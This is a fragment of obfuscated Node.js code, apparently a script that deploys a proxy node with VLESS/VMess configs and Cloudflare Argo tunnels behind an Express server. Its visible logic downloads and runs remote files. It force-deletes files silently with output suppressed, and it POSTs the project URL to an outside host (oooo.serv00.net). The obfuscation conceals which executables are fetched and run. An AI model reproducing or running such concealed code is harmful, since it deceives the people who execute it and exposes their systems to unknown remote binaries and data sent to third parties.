uccessfully','config.yaml','win32','del\x20/f\x20/q\x20','pipe','\x20>/dev/null\x202>&1','xtls-rprx-vision','/vmess-argo?ed=2560','send','post','match','127.0.0.1','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','message','{}.constructor(\x22return\x20this\x22)(\x20)','statSync','log','firefox','\x20-c\x20\x22','/api/add-subscriptions','createWriteStream','App\x20is\x20running','.exe\x20>\x20nul\x202>&1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0avless://','Download\x20','8443','automatic\x20access\x20task\x20added\x20successfully','express','2009307OHPCMx','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'];a0_0x2e89=function(){return _0x71ab92;};return a0_0x2e89();}cleanFiles();async function AddVisitTask(){const _0x2b42cf=a0_0x3d98fb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2b42cf(0x184)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3fd95e=await axios[_0x2b42cf(0x17d)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2b42cf(0xc9)}});return console[_0x2b42cf(0x184)](_0x2b42cf(0x18f)),_0x3fd95e;}catch(_0x3b3037){return console[_0x2b42cf(0x13f)](_0x2b42cf(0xe4)+_0x3b3037[_0x2b42cf(0x181)]),null;}}async function startserver(){const _0x2ccb23=a0_0x3d98fb;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x297153){console[_0x2ccb23(0x13f)](_0x2ccb23(0x12c),_0x297153);}}startserver()['catch'](_0x340617=>{const _0x3a6801=a0_0x3d98fb;console['error'](_0x3a6801(0x126),_0x340617);}),app[a0_0x3d98fb(0xc1)](PORT,()=>console[a0_0x3d98fb(0x184)](a0_0x3d98fb(0xf9)+PORT+'!'));
